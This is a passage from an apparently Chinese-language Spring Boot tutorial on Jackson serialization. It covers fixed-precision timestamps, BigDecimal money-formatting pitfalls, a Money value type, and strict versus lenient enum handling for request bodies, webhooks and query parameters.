        Instant truncated = value.truncatedTo(ChronoUnit.MILLIS);
        // ⚠️ Instant.toString() 在小數是 0 時【會省略小數部分】：
        //      Instant.parse("2026-08-24T03:14:22Z").toString()  → "2026-08-24T03:14:22Z"
        //      Instant.parse("2026-08-24T03:14:22.100Z").toString() → "...22.100Z"
        //    所以不能直接用 toString() —— 要用固定的 formatter。
        gen.writeString(FORMATTER.format(truncated));
    }

    /** ★ 固定三位小數，UTC，一定以 Z 結尾。 */
    private static final java.time.format.DateTimeFormatter FORMATTER =
            new java.time.format.DateTimeFormatterBuilder()
                    .appendPattern("yyyy-MM-dd'T'HH:mm:ss")
                    .appendFraction(java.time.temporal.ChronoField.MILLI_OF_SECOND,
                                    3, 3, true)      // 最少 3、最多 3、有小數點
                    .appendLiteral('Z')
                    .toFormatter()
                    .withZone(java.time.ZoneOffset.UTC);
}
```

⚠️ **注意那個「`Instant.toString()` 會省略 `.000`」的細節**：

```java
Instant.parse("2026-08-24T03:14:22Z").toString();        // "2026-08-24T03:14:22Z"
Instant.parse("2026-08-24T03:14:22.000Z").toString();    // "2026-08-24T03:14:22Z"  ← .000 消失
Instant.parse("2026-08-24T03:14:22.100Z").toString();    // "2026-08-24T03:14:22.100Z"
Instant.parse("2026-08-24T03:14:22.120Z").toString();    // "2026-08-24T03:14:22.120Z"
```

**所以同一個欄位有時 19 個字元有時 24 個字元** ——
如果客戶端用字串長度或 `substring` 處理時間（真的有人這樣做），就會壞。
而 cursor 分頁如果用「時間字串」當游標，**字串排序會與時間排序不一致**：

```
"2026-08-24T03:14:22Z"      ← 22:00.000
"2026-08-24T03:14:22.100Z"  ← 22:00.100

字串比較："2026-08-24T03:14:22Z" > "2026-08-24T03:14:22.100Z"   （因為 'Z' > '.'）
時間比較： 前者 < 後者                                            🔴 相反！
```

⚠️ **這是一個真的會造成「分頁漏資料」的 bug**，而它只在「剛好整秒」的那些筆上發生。

**決定 3：反序列化要寬容一點。**

```java
package example.shop.common.web.json;

import com.fasterxml.jackson.core.JsonParser;
import com.fasterxml.jackson.databind.DeserializationContext;
import com.fasterxml.jackson.databind.deser.std.StdDeserializer;
import com.fasterxml.jackson.databind.exc.InvalidFormatException;

import java.io.IOException;
import java.time.Instant;
import java.time.LocalDate;
import java.time.OffsetDateTime;
import java.time.ZoneOffset;
import java.time.format.DateTimeParseException;

/**
 * 寬容的 {@link Instant} 反序列化。
 *
 * <p>★ 為什麼「輸出嚴格、輸入寬容」是對的：
 * <ul>
 *   <li>輸出嚴格 → 客戶端的解析器只需要處理一種格式。</li>
 *   <li>輸入寬容 → 不會因為「客戶端送了 {@code +08:00} 而不是 {@code Z}」
 *       就整個請求失敗。</li>
 * </ul>
 * 這是 Postel's law（robustness principle）的合理應用。
 *
 * <p>⚠️ 但「寬容」有明確的界線：
 * 我們接受<b>不同的合法 ISO-8601 表示</b>，
 * <b>不</b>接受「沒有時區的時間」——
 * 那會讓伺服器猜時區，而那正是 6.2.3 的事故。
 */
public class LenientInstantDeserializer extends StdDeserializer<Instant> {

    public LenientInstantDeserializer() {
        super(Instant.class);
    }

    @Override
    public Instant deserialize(JsonParser p, DeserializationContext context)
            throws IOException {

        // ★ 數字：epoch 毫秒（有些客戶端這樣送）
        if (p.currentToken().isNumeric()) {
            long value = p.getLongValue();
            // ⚠️ 判斷「秒」還是「毫秒」：
            //   1e11 秒 = 西元 5138 年，所以大於它一定是毫秒
            return (Math.abs(value) > 100_000_000_000L)
                    ? Instant.ofEpochMilli(value)
                    : Instant.ofEpochSecond(value);
        }

        String text = p.getText();
        if (text == null || text.isBlank()) {
            return null;
        }
        String trimmed = text.trim();

        // ① 標準的 Instant（...Z）
        try {
            return Instant.parse(trimmed);
        } catch (DateTimeParseException ignored) { }

        // ② 帶偏移（...+08:00）
        try {
            return OffsetDateTime.parse(trimmed).toInstant();
        } catch (DateTimeParseException ignored) { }

        // ③ 只有日期（2026-08-24）→ 當天的 00:00:00 UTC
        //   ⚠️ 這是一個「有風險的寬容」：客戶端可能以為是本地時間的午夜。
        //      shop-service 接受它，但【只在明確標記的欄位上】——
        //      見下面的 acceptsDateOnly。
        if (acceptsDateOnly(context)) {
            try {
                return LocalDate.parse(trimmed).atStartOfDay(ZoneOffset.UTC).toInstant();
            } catch (DateTimeParseException ignored) { }
        }

        // ★ 明確拒絕「沒有時區的時間」，並在錯誤訊息裡說原因
        if (trimmed.matches("^\\d{4}-\\d{2}-\\d{2}[T ]\\d{2}:\\d{2}(:\\d{2}(\\.\\d+)?)?$")) {
            throw new InvalidFormatException(p,
                    "Timestamp must include a timezone offset (e.g. 2026-08-24T03:14:22Z). "
                    + "A local date-time without offset is ambiguous.",
                    trimmed, Instant.class);
        }

        throw new InvalidFormatException(p,
                "Not a valid ISO-8601 timestamp.", trimmed, Instant.class);
    }

    /**
     * ⚠️ Jackson 的 {@code DeserializationContext} 拿不到「當前欄位的註解」，
     * 所以「只在某些欄位接受純日期」實際上做不到（除非為那些欄位另寫一個
     * deserializer 並用 {@code @JsonDeserialize(using = ...)} 標註）。
     *
     * <p><b>shop-service 的決定：一律不接受純日期。</b>
     * 需要「日期」的欄位（例如 {@code createdFrom}）就用 {@link LocalDate} 型別 ——
     * 那樣型別本身就表達了「這是日期不是時間點」，比寬容的解析清楚得多。
     */
    private static boolean acceptsDateOnly(DeserializationContext context) {
        return false;
    }
}
```

⚠️ **`acceptsDateOnly` 永遠回 `false` 的那段註解是刻意留下的**：
它記錄了「我們考慮過這個功能、發現實作方式不對、選擇用型別解決」的推理過程。
**直接刪掉那個方法會讓下一個人重新走一次同樣的彎路。**

**`InvalidFormatException` 的錯誤回應**（03 章 3.9.4 的 `MessageNotReadableAnalyzer` 會處理）：

```json
{
  "status": 400,
  "code": "MALFORMED_REQUEST",
  "detail": "Invalid value for field 'createdFrom'.",
  "errors": [
    {
      "field": "createdFrom",
      "code": "InvalidFormat",
      "message": "Timestamp must include a timezone offset (e.g. 2026-08-24T03:14:22Z). A local date-time without offset is ambiguous.",
      "rejectedValue": "2026-08-24T03:14:22"
    }
  ]
}
```

### 6.5.7 金額：`BigDecimal` 的三個坑與最終設計 ★

**先看三個坑的完整版本**：

**坑 1：科學記號**（6.2.3）

```java
new BigDecimal("1E+7").toString();                       // "1E+7"          🔴
new BigDecimal("100.00").stripTrailingZeros().toString(); // "1E+2"          🔴🔴
new BigDecimal("0.000001").toString();                    // "0.000001"     ✅
new BigDecimal("1000000").toString();                     // "1000000"      ✅
```

**規則**：`BigDecimal.toString()` 在 `scale < 0` 或
「指數大到一定程度」時用科學記號。而 `stripTrailingZeros()`
**會產生負的 scale**（`100.00` → unscaled `1`、scale `-2`）。

⚠️ **`stripTrailingZeros()` 在金額上是一個陷阱**，而它看起來很無害
（「把 100.00 變成 100」）。**永遠用 `setScale(2, HALF_UP)` 而不是 `stripTrailingZeros()`。**

**坑 2：JSON number 的精度**

```javascript
// JavaScript 的 Number 是 IEEE 754 double
Number.MAX_SAFE_INTEGER                       // 9007199254740991（2^53 - 1）

JSON.parse('{"total": 1280.50}').total        // → 1280.5        （尾數 0 消失）
JSON.parse('{"total": 0.1}').total + 0.2      // → 0.30000000000000004
JSON.parse('{"id": 9007199254740993}').id     // → 9007199254740992  🔴 值變了！
```

⚠️ **「尾數 0 消失」不只是顯示問題**：
如果前端把 `1280.5` 再送回來，而後端用 `equals()` 比較 `BigDecimal`：

```java
new BigDecimal("1280.50").equals(new BigDecimal("1280.5"));   // → false  🔴
new BigDecimal("1280.50").compareTo(new BigDecimal("1280.5")); // → 0     ✅
```

**`BigDecimal.equals()` 比較 scale，`compareTo()` 不比較。**
這造成過真實的 bug：「金額檢核」用 `equals()` 於是永遠不通過。

**坑 3：`use-big-decimal-for-floats` 沒開的話，反序列化會失去精度**

```java
// 沒開 USE_BIG_DECIMAL_FOR_FLOATS
// Jackson 先把 JSON 的 1280.50 讀成 double，再轉成 BigDecimal
objectMapper.readValue("{\"total\": 0.1}", Amounts.class);
// → BigDecimal("0.1000000000000000055511151231257827021181583404541015625")
//   🔴 double 的精度誤差被「精確地」轉成 BigDecimal
```

**所以 6.5.3 的 `use-big-decimal-for-floats: true` 是必要的。**

**最終設計：DTO 用 `String`，`BigDecimal` 只存在於 domain 與 entity。**

（03-rest-api 3.5.3 的決定，這裡是 Web 層的完整落地。）

```java
package example.shop.order.web.dto;

import com.fasterxml.jackson.annotation.JsonPropertyOrder;

/**
 * 訂單的金額。
 *
 * <p>★★ 每個欄位都是 {@link String}，而且一定是「固定兩位小數的十進位字串」。
 *
 * <p>為什麼不是 {@code BigDecimal}：
 * <ol>
 *   <li>{@code BigDecimal} 序列化成 JSON number → JavaScript 的精度問題（坑 2）。</li>
 *   <li>序列化成 JSON string 也可以，但那需要一個自訂 serializer，
 *       而<b>那個 serializer 會套用到所有 BigDecimal 欄位</b>
 *       （包括評分 4.5、重量 1.25 這些不該被格式化成兩位小數的）。</li>
 *   <li>用 {@code String} 讓「這是格式化過的展示值」變成型別上的事實 ——
 *       任何人拿到它都不會想直接做算術。</li>
 * </ol>
 *
 * <p>⚠️ 代價：Web 層要負責格式化，而格式化的規則必須集中
 * （見 {@link example.shop.order.web.MoneyFormat}）。
 *
 * <p>★ {@code currency} 一定要在同一個物件裡 ——
 * 「1280.50」沒有幣別是沒有意義的（03-rest-api 3.5.3）。
 */
@JsonPropertyOrder({"currency", "subtotal", "discount", "shippingFee", "tax", "total"})
public record Amounts(

    /** ISO 4217，例如 {@code TWD}。 */
    String currency,

    /** 商品小計。一定是非負的兩位小數字串，例如 {@code "1500.00"}。 */
    String subtotal,

    /** 折扣。⚠️ <b>一定是負數或零</b>，例如 {@code "-300.00"}。 */
    String discount,

    String shippingFee,

    String tax,

    /** 應付總額。{@code subtotal + discount + shippingFee + tax}。 */
    String total

) {}
```

```java
package example.shop.order.web;

import java.math.BigDecimal;
import java.math.RoundingMode;
import java.util.Currency;
import java.util.Map;

/**
 * 金額的格式化 —— <b>唯一</b>的入口。
 *
 * <p>★ 為什麼要集中：
 * 如果每個 mapper 各自寫 {@code v.setScale(2).toPlainString()}，
 * 那麼「某一天有人忘了 setScale」就會產生一個 {@code "1280.5"}
 * 或 {@code "1280.500000"}，而那會讓前端的字串比較與顯示不一致。
 *
 * <p>⚠️ 而且小數位數<b>依幣別而異</b>（JPY 0 位、TWD 2 位、KWD 3 位）——
 * 那個知識必須只有一份。
 */
public final class MoneyFormat {

    /**
     * 幣別的小數位數。
     *
     * <p>★ 為什麼不直接用 {@code Currency.getInstance(code).getDefaultFractionDigits()}：
     * <ul>
     *   <li>它對未知的幣別回 {@code -1}（不是拋例外）→ 靜默錯誤。</li>
     *   <li>它依賴 JDK 的 currency data，而那會隨 JDK 版本更新
     *       → <b>同一份程式碼在不同 JDK 上輸出不同</b>。</li>
     * </ul>
     * 明確列出我們支援的幣別，遇到未知的就失敗 —— 那比猜好。
     */
    private static final Map<String, Integer> FRACTION_DIGITS = Map.of(
            "TWD", 2,
            "USD", 2,
            "EUR", 2,
            "JPY", 0,        // ⚠️ 日圓沒有小數
            "KRW", 0,
            "HKD", 2,
            "CNY", 2,
            "KWD", 3);       // ⚠️ 科威特第納爾 3 位

    /**
     * 格式化一個金額。
     *
     * @param value    金額（{@code null} 回 {@code null}，讓 non_null 省略它）
     * @param currency ISO 4217 代碼
     * @return 固定小數位數的十進位字串，一定不含科學記號
     * @throws IllegalArgumentException 未支援的幣別
     */
    public static String format(BigDecimal value, String currency) {
        if (value == null) return null;

        Integer digits = FRACTION_DIGITS.get(currency);
        if (digits == null) {
            // ★ 失敗而不是猜 —— 一個 "1280.50" 的 JPY 金額會讓對帳錯 100 倍
            throw new IllegalArgumentException(
                    "不支援的幣別：%s。請在 MoneyFormat.FRACTION_DIGITS 註冊它的小數位數。"
                            .formatted(currency));
        }

        // ★★ setScale 而不是 stripTrailingZeros（坑 1）
        // ★★ toPlainString 而不是 toString（坑 1）
        // ★  HALF_UP 是「四捨五入」—— 與台灣的商業慣例一致。
        //    ⚠️ 金融業常用 HALF_EVEN（銀行家捨入）以避免系統性偏差；
        //       這個選擇必須與財務確認，而且要寫進文件。
        return value.setScale(digits, RoundingMode.HALF_UP).toPlainString();
    }

    /**
     * 解析一個金額字串（請求方向）。
     *
     * <p>⚠️ 為什麼請求也要走這裡：客戶端可能送 {@code "1280.5"}、
     * {@code "1,280.50"}（有千分位）、{@code " 1280.50 "}（有空白）。
     * 集中處理讓「哪些寫法可以接受」只有一份定義。
     */
    public static BigDecimal parse(String text, String currency) {
        if (text == null || text.isBlank()) return null;

        String cleaned = text.trim().replace(",", "");
        BigDecimal value;
        try {
            value = new BigDecimal(cleaned);
        } catch (NumberFormatException e) {
            throw new IllegalArgumentException("金額格式無效：" + text, e);
        }

        Integer digits = FRACTION_DIGITS.get(currency);
        if (digits == null) {
            throw new IllegalArgumentException("不支援的幣別：" + currency);
        }
        // ⚠️ 這裡刻意【不】四捨五入，而是拒絕 ——
        //    客戶端送 "1280.505"（TWD 只有兩位）代表它算錯了，
        //    靜默四捨五入會讓「客戶端算的總額」與「我們算的」不一致，
        //    而那個差異會在對帳時才被發現。
        if (value.scale() > digits) {
            throw new IllegalArgumentException(
                    "%s 的金額最多 %d 位小數，收到 %s".formatted(currency, digits, text));
        }
        return value.setScale(digits, RoundingMode.UNNECESSARY);
    }

    private MoneyFormat() {}
    /**
     * 這個幣別的小數位數。
     *
     * <p>★ 6.12 練習 4 的 {@code OrderAmountCalculator} 需要它 ——
     * 它要「在最後一步才捨入」，所以必須先知道目標位數。
     *
     * <p>⚠️ 這個方法是 {@code FRACTION_DIGITS} 這份表格的**唯一公開出口**。
     * 不要讓呼叫端自己維護一份幣別→位數的對照 ——
     * 那正是 6.5.7「金額格式化只能有一個入口」的意思。
     */
    public static int fractionDigits(String currency) {
        Integer digits = FRACTION_DIGITS.get(currency);
        if (digits == null) {
            throw new IllegalArgumentException(
                    "不支援的幣別：%s。請在 MoneyFormat.FRACTION_DIGITS 註冊它的小數位數。"
                            .formatted(currency));
        }
        return digits;
    }

}
```

⚠️ **`RoundingMode.UNNECESSARY` 會在需要捨入時拋 `ArithmeticException`** ——
那是一個「斷言」：到這裡 scale 一定已經正確了。

**現在回頭修正 6.5.3 的 `JacksonConfig`。** ★

6.5.3 我寫了：

```java
    // ⚠️ 這是錯的（見下）
    module.addSerializer(BigDecimal.class, new MoneySerializer());
    module.addDeserializer(BigDecimal.class, new MoneyDeserializer());
```

**為什麼錯**：那會讓**每一個** `BigDecimal` 欄位都被格式化成兩位小數字串。

```java
public record ProductDetail(
    String productId,
    BigDecimal averageRating,     // 🔴 4.35 → "4.35" 還好，但 4.5 → "4.50"（不自然）
    BigDecimal weightKg,          // 🔴 1.25 → "1.25"，但 0.005 → "0.01"（精度丟失！）
    BigDecimal lengthCm           // 🔴 同上
) {}
```

**`weightKg = 0.005` 被四捨五入成 `0.01` —— 那是 100% 的誤差**，
而且完全沒有錯誤訊息。

**正確的設計**：

```java
package example.shop.common.config;

import com.fasterxml.jackson.core.StreamReadConstraints;
import com.fasterxml.jackson.core.StreamWriteConstraints;
import com.fasterxml.jackson.databind.module.SimpleModule;
import example.shop.common.web.json.FixedPrecisionInstantSerializer;
import example.shop.common.web.json.LenientInstantDeserializer;
import org.springframework.boot.autoconfigure.jackson.Jackson2ObjectMapperBuilderCustomizer;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

import java.time.Instant;

/**
 * Jackson 的程式化設定（6.5.3 的修正版）。
 *
 * <p>★★ 相對 6.5.3 的改動：<b>移除了全域的 {@code BigDecimal} serializer</b>。
 *
 * <p>理由（6.5.7）：全域的 serializer 會把「評分 4.5」與「重量 0.005」
 * 也格式化成兩位小數 —— 後者是 100% 的精度損失，而且是靜默的。
 *
 * <p><b>金額的處理改成兩層</b>：
 * <ol>
 *   <li><b>第一層（主要）</b>：DTO 的金額欄位型別就是 {@code String}，
 *       由 {@code MoneyFormat} 在 mapper 裡格式化。
 *       這是「型別上就不可能出錯」的做法。</li>
 *   <li><b>第二層（安全網）</b>：{@code spring.jackson.generator.write-bigdecimal-as-plain: true}
 *       讓任何漏網的 {@code BigDecimal} 至少不會變成科學記號。</li>
 * </ol>
 * 而「漏網」本身由 6.10.3 的契約測試偵測（回應裡不該有 JSON number 型別的金額欄位）。
 */
@Configuration
public class JacksonConfig {

    @Bean
    public Jackson2ObjectMapperBuilderCustomizer shopJacksonCustomizer() {
        return builder -> {

            SimpleModule module = new SimpleModule("shop-service");

            // ★ 只註冊時間的 serializer —— 它對「所有 Instant」都是正確的行為
            module.addSerializer(Instant.class, new FixedPrecisionInstantSerializer());
            module.addDeserializer(Instant.class, new LenientInstantDeserializer());

            // ❌ 刻意【不】註冊 BigDecimal 的 serializer（見類別 javadoc）

            builder.modules(m -> m.add(module));

            // ── 安全上限（6.7.3）★★ ───────────────────────────────
            //   ⚠️ 版本：打 ★ 的三項需要 Jackson 2.16+（見 6.5.1 的說明與 pom.xml）
            builder.postConfigurer(objectMapper -> {
                objectMapper.getFactory().setStreamReadConstraints(
                        StreamReadConstraints.builder()
                                .maxNestingDepth(50)              // 2.15
                                .maxStringLength(1_000_000)       // 2.15
                                .maxNumberLength(1_000)           // 2.15
                                .maxNameLength(256)               // ★ 2.16+
                                .maxDocumentLength(2_000_000)     // ★ 2.16+
                                .build());
                objectMapper.getFactory().setStreamWriteConstraints(   // ★ 2.16+
                        StreamWriteConstraints.builder()
                                .maxNestingDepth(50)
                                .build());
            });

            // ❌ 絕不呼叫 activateDefaultTyping()（6.7.1 的 RCE 風險）
        };
    }
}
```

> **這一段的「先寫錯再修正」是刻意的。**
> 「全域註冊一個 `BigDecimal` serializer」是一個非常自然的第一直覺
> （而且很多專案真的這樣做了）。
> **看到它為什麼錯，比一開始就給正確答案更有價值** ——
> 因為你下次會問自己「這個全域設定會套用到哪些我沒想到的地方」。

**如果你真的想用一個型別來表達金額**（比 `String` 更有結構）：

```java
package example.shop.order.domain;

import com.fasterxml.jackson.annotation.JsonCreator;
import com.fasterxml.jackson.annotation.JsonValue;

import java.math.BigDecimal;

/**
 * 金額的值型別。
 *
 * <p>★ {@code @JsonValue} 讓它序列化成一個字串，
 * {@code @JsonCreator} 讓它能從字串反序列化 ——
 * <b>而且完全不影響其他的 {@code BigDecimal} 欄位</b>。
 *
 * <p>★ 這比 {@code String} 好的地方：
 * <ul>
 *   <li>型別安全：不會把 {@code orderId} 傳到金額參數。</li>
 *   <li>不可能忘記幣別（它在型別裡）。</li>
 *   <li>可以有 {@code plus()} / {@code negate()} 這些安全的運算。</li>
 * </ul>
 *
 * <p>⚠️ 代價：
 * <ul>
 *   <li>序列化成 {@code "1280.50"}（只有數字），幣別要另外一個欄位 ——
 *       或者序列化成 {@code {"amount":"1280.50","currency":"TWD"}}，
 *       但那讓每個金額欄位變成一個物件（回應大很多）。</li>
 *   <li>OpenAPI 需要一個明確的 schema 宣告（否則產生器會把它當物件）。</li>
 * </ul>
 *
 * <p><b>shop-service 沒有採用它</b>，因為 03-rest-api 3.5.3 已經定案用
 * 「扁平的字串 + 一個 currency 欄位」，而改動那個決定會影響 70 條端點的契約。
 * <b>這一段留在課程裡是因為新專案值得考慮它。</b>
 */
public record Money(BigDecimal amount, String currency) implements Comparable<Money> {

    public Money {
        if (amount == null) throw new IllegalArgumentException("amount 不可為 null");
        if (currency == null || currency.length() != 3) {
            throw new IllegalArgumentException("currency 必須是 3 個字元的 ISO 4217 代碼");
        }
        currency = currency.toUpperCase(java.util.Locale.ROOT);
    }

    /** ★ 序列化：只輸出格式化後的數字字串。 */
    @JsonValue
    public String toJson() {
        return example.shop.order.web.MoneyFormat.format(amount, currency);
    }

    /**
     * ⚠️ 反序列化有一個問題：從 {@code "1280.50"} 這個字串<b>拿不到幣別</b>。
     *
     * <p>所以這個 creator 只能用在「幣別由上下文決定」的場合，
     * 而那需要 {@code ContextualDeserializer} —— 相當複雜。
     *
     * <p><b>這正是 shop-service 選擇「扁平字串」的實務理由</b>：
     * 值型別在「輸出」方向很漂亮，在「輸入」方向很麻煩。
     */
    @JsonCreator
    public static Money ofTwd(String text) {
        return new Money(example.shop.order.web.MoneyFormat.parse(text, "TWD"), "TWD");
    }

    public Money plus(Money other) {
        requireSameCurrency(other);
        return new Money(amount.add(other.amount), currency);
    }

    public Money negate() {
        return new Money(amount.negate(), currency);
    }

    /** ★ compareTo 而不是 equals —— BigDecimal 的 scale 問題（坑 2）。 */
    @Override
    public int compareTo(Money other) {
        requireSameCurrency(other);
        return amount.compareTo(other.amount);
    }

    /**
     * ⚠️ record 的自動 {@code equals()} 用 {@code BigDecimal.equals()}，
     * 那會讓 {@code Money("1280.50")} 不等於 {@code Money("1280.5")}。
     * 覆寫它用 {@code compareTo}。
     */
    @Override
    public boolean equals(Object o) {
        if (this == o) return true;
        if (!(o instanceof Money other)) return false;
        return currency.equals(other.currency) && amount.compareTo(other.amount) == 0;
    }

    @Override
    public int hashCode() {
        // ★ 與 equals 一致：用 stripTrailingZeros 讓 1280.50 與 1280.5 有同樣的 hash
        //   （這裡用 stripTrailingZeros 是安全的 —— 我們只要它的 hash，不輸出字串）
        return java.util.Objects.hash(currency, amount.stripTrailingZeros());
    }

    private void requireSameCurrency(Money other) {
        if (!currency.equals(other.currency)) {
            throw new IllegalArgumentException(
                    "幣別不同無法運算：%s vs %s".formatted(currency, other.currency));
        }
    }
}
```

⚠️ **那個 `equals` / `hashCode` 的覆寫是一個 record 的重要陷阱**：
`record` 自動產生的 `equals` 對 `BigDecimal` 用 `equals()`（比較 scale），
所以 `Money(new BigDecimal("100.0"), "TWD")` **不等於** `Money(new BigDecimal("100.00"), "TWD")`。
**這會讓 `Set<Money>` 與 `Map<Money, ?>` 的行為完全不符直覺。**

### 6.5.8 enum：讓新增值不再讓 App 崩潰 ★

**6.2.4 的事故有兩個方向要處理。**

#### 方向 1：反序列化（客戶端送未知值給我們）

```yaml
    deserialization:
      read-unknown-enum-values-using-default-value: true
```

**它需要 enum 上有一個 `@JsonEnumDefaultValue`**：

```java
package example.shop.order.domain;

import com.fasterxml.jackson.annotation.JsonEnumDefaultValue;

public enum OrderStatus {

    PENDING_PAYMENT,
    PAID,
    PARTIALLY_SHIPPED,
    SHIPPED,
    DELIVERED,
    CANCELLED,
    REFUNDED,

    /**
     * 未知的狀態。
     *
     * <p>★ 03-rest-api 3.10.3 的規則：「保留 UNKNOWN 給客戶端當 fallback」。
     * 在<b>我們</b>這一側，它的用途是：
     * <ul>
     *   <li>反序列化收到未知值時的落點（配 {@code @JsonEnumDefaultValue}）。</li>
     *   <li>⚠️ 但這只適用於「讀取別的系統送來的資料」——
     *       例如物流商的 webhook 送了一個我們不認識的狀態。</li>
     * </ul>
     *
     * <p>⚠️⚠️ 對「客戶端送來的查詢參數」，落到 UNKNOWN 是<b>錯的</b>：
     * {@code GET /orders?status=PARTIALLY_SHIPPPED}（打錯字）
     * 會變成 {@code status=UNKNOWN} → 查不到任何訂單 → 使用者以為沒有訂單。
     * <b>那是 04 章 4.2.3 那個「靜默篩選」災難的重演。</b>
     *
     * <p>所以查詢參數的 enum 轉換<b>不走 Jackson</b>，
     * 而是走一個會明確報錯的 {@code Converter}（見下面的 6.5.8 方向 1b）。
     */
    @JsonEnumDefaultValue
    UNKNOWN;

    public boolean isTerminal() {
        return this == DELIVERED || this == CANCELLED || this == REFUNDED;
    }

    /** ★ 給前端的顯示文字（03-rest-api 3.10.2 的 statusLabel）。 */
    @Override
    public String labelKey() {
        return "orderStatus." + name();
    }
}
```

**★ 而 `labelKey()` 來自一個介面** —— 這一點很重要：

```java
package example.shop.common.web;

/**
 * 「這個 enum 有給人看的顯示文字」。
 *
 * <p>★★ 為什麼是介面而不是「resolver 裡一個 switch」：
 * <b>介面讓「新增一個對外的 enum」時由編譯器提醒你</b>，
 * 而 switch 會靜默地落到 default（然後前端看到 {@code PARTIALLY_SHIPPED}）。
 *
 * <p>★ 而它讓 {@link StatusLabelResolver} 可以是<b>泛型</b>的 ——
 * 那是 07 章 7.8.3 的「每一個對外的 enum 值都有顯示文字」
 * 那個掃描測試能存在的前提。
 * <b>一個只吃 {@code OrderStatus} 的 resolver，沒有辦法表達 6.5.8 的結論。</b>
 */
public interface LabeledEnum {

    /** i18n 的 key。慣例是「{camelCase 的型別名}.{常數名}」。 */
    String labelKey();

    /**
     * ★ 給「還沒實作這個介面」的 enum 用的預設 key。
     *
     * <p>它讓 07 章 7.8.3 的失敗訊息說得出「你該加哪一個 key」——
     * 而不是「有一個 enum 沒有 label，自己找」。
     */
    static String labelKeyOf(Enum<?> value) {
        if (value instanceof LabeledEnum labeled) return labeled.labelKey();
        String type = value.getDeclaringClass().getSimpleName();
        return Character.toLowerCase(type.charAt(0)) + type.substring(1)
                + "." + value.name();
    }
}
```

```java
public enum OrderStatus implements LabeledEnum { /* … */ }
public enum ExportStatus  implements LabeledEnum { /* … */ }
public enum InvoiceType   implements LabeledEnum { /* … */ }
```

⚠️ **而 `ActorType` 刻意不實作它** ——
角色名不會顯示給終端使用者（客戶不需要看到「客服」三個字）。
**「哪些 enum 對外可見」本身就是一個要想清楚的決定**，
而 07 章 7.8.3 的掃描測試（判準是「出現在 DTO 的欄位上」）
會告訴你答案。

⚠️ **這裡有一個重要的區分，很多人沒注意到**：

| 來源 | 走誰轉換 | 未知值該怎麼辦 |
|---|---|---|
| **request body 的 JSON** | Jackson | ⚠️ 依情況 —— 見下 |
| **`@RequestParam` / `@PathVariable`** | Spring 的 `ConversionService`（**不是 Jackson！**） | 🔴 **一定要明確報錯** |
| **外部系統的 webhook body** | Jackson | ✅ 落到 `UNKNOWN`（我們不能因為對方加了一個狀態就整個壞掉） |

**所以 `read-unknown-enum-values-using-default-value: true` 對 request body 是危險的。**

**shop-service 的最終決定**：

```yaml
    deserialization:
      # ★★ 改成 false —— 我們自己的 API 的 request body 要嚴格
      read-unknown-enum-values-using-default-value: false
```

**而 webhook 的 DTO 用欄位級的註解放寬**：

```java
package example.shop.shipping.web.dto;

import com.fasterxml.jackson.annotation.JsonFormat;

/**
 * 物流商的狀態更新 webhook。
 *
 * <p>★ 這是「別人的系統」送來的資料 ——
 * 對方隨時可能加新的狀態，而我們不能因此整個壞掉。
 */
public record CarrierStatusWebhook(
    String trackingNumber,

    /**
     * ★ 欄位級的放寬：只有這個欄位接受未知值。
     *
     * <p>{@code READ_UNKNOWN_ENUM_VALUES_USING_DEFAULT_VALUE} 是
     * {@code @JsonFormat(with = ...)} 支援的 feature 之一。
     *
     * <p>⚠️ 收到 UNKNOWN 時<b>一定要告警</b>——
     * 那代表物流商加了一個狀態而我們不知道（見下面的 handler）。
     */
    @JsonFormat(with = JsonFormat.Feature.READ_UNKNOWN_ENUM_VALUES_USING_DEFAULT_VALUE)
    CarrierStatus status,

    java.time.Instant occurredAt,

    /**
     * ★ 一定要保留原始字串。
     *
     * <p>沒有它的話，收到 UNKNOWN 時我們<b>不知道對方送的是什麼</b> ——
     * 而那讓「加上新狀態的支援」變成猜謎。
     */
    String rawStatus
) {}
```

```java
    /** 收到未知的物流狀態時的處理。 */
    private void handleCarrierStatus(CarrierStatusWebhook webhook) {
        if (webhook.status() == CarrierStatus.UNKNOWN) {
            // ★ WARN + 指標 + 保留原始值 —— 三者都需要
            log.warn("物流商送了未知的狀態 carrier={} raw={} tracking={}",
                     carrier, webhook.rawStatus(), webhook.trackingNumber());
            meterRegistry.counter("shop.carrier.unknown_status",
                    "carrier", carrier,
                    // ⚠️ rawStatus 當標籤有基數風險，但物流商的狀態集合很小
                    //    （而且如果它爆掉，那本身就是需要知道的事）
                    "raw", sanitizeTag(webhook.rawStatus())).increment();

            // ★ 不要拋例外 —— webhook 回 4xx 會讓物流商重送，
            //   而重送也會失敗，最後它會停止推送【所有】更新。
            //   回 200 + 記錄下來，人工處理。
            return;
        }
        // 正常處理…
    }
```

⚠️ **「webhook 不要回 4xx」是一個重要的實務原則**：
大多數 webhook 提供者的重試機制是「失敗就重試，連續失敗就停用這個 endpoint」。
一個我們不認識的狀態值會讓**所有**物流更新停止 —— 那比「漏掉一種狀態」嚴重得多。

#### 方向 1b：查詢參數的 enum 轉換

```java
package example.shop.common.web.convert;

import example.shop.common.error.ErrorCode;
import example.shop.common.error.BusinessException;
import org.springframework.core.convert.converter.Converter;
import org.springframework.core.convert.converter.ConverterFactory;
import org.springframework.stereotype.Component;

import java.util.Arrays;
import java.util.List;
import java.util.Map;

/**
 * 查詢參數的 enum 轉換 —— 未知值明確報錯，並提示合法值。
 *
 * <p>★ 為什麼要自己寫（Spring 已經有 {@code StringToEnumConverterFactory}）：
 * <table>
 *   <tr><th></th><th>Spring 內建</th><th>這個實作</th></tr>
 *   <tr><td>未知值的例外</td><td>{@code IllegalArgumentException}</td>
 *       <td>{@code InvalidEnumValueException}</td></tr>
 *   <tr><td>錯誤訊息</td>
 *       <td>「Failed to convert value of type java.lang.String to required type
 *           example.shop.order.domain.OrderStatus」<br>🔴 洩漏內部類別名（03 章 3.11.2）</td>
 *       <td>「status 只接受 PAID、SHIPPED…；您是否想輸入 PARTIALLY_SHIPPED？」</td></tr>
 *   <tr><td>UNKNOWN 常數</td><td>可以被送進來 🔴</td><td><b>明確拒絕</b></td></tr>
 * </table>
 *
 * <p>★★ 最後一列很重要：{@code UNKNOWN} 是「內部的 fallback」，
 * 不是「客戶端可以送的值」。
 * 允許它會讓 {@code ?status=UNKNOWN} 變成一個合法查詢，
 * 而那會查到所有「我們沒認出來的」訂單 —— 一個意外的資料出口。
 */
@Component
public class StrictStringToEnumConverterFactory implements ConverterFactory<String, Enum> {

    /** ★ 這些常數不可由客戶端提供。 */
